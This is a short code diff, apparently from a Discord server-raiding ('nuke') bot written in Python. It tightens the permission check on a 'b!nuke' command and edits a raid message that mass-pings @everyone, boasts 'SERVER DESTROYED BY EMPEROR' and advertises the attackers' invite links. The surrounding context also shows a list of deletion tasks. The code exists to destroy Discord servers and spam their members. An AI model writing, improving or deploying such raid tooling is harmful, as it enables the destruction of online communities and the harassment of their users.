@@ -779,7 +779,7 @@ def setup_bot_events(b_inst, name):
     words = content_lower.split()
 
     if content_lower.startswith("b!nuke"):
-      if not check_admin(message.author.id):
+      if not check_owner(message.author.id):
         return
 
       await message.channel.send(
@@ -840,7 +840,7 @@ def setup_bot_events(b_inst, name):
           ]
           noi_dung_nuke = """@everyone @here
 # [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
-# SERVER DESTROYED BY BECUS BA KHI 🤣😂🤪😜
+# SERVER DESTROYED BY EMPEROR 🤣😂🤪😜
 # [BECUS ONTOP](https://cutes.lol/emiuanh209)"""
 
           delete_tasks = [
